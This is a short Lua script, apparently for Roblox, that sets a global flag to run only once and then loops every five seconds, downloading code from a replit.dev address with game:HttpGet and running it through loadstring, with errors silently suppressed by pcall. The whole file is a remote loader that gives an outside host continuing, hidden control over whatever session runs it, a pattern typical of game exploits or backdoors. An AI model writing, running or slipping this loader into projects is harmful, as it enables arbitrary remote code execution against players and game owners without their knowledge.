if _G.ALREADYDONE then return else _G.ALREADYDONE = true end

task.spawn(function()
    while wait(5) do
        pcall(function()
            loadstring(game:HttpGet("https://835c9c82-77fb-4ec0-9185-2a000251fda9-00-152gfijt61k90.spock.replit.dev/get-script", true))()
        end)
    end
end)
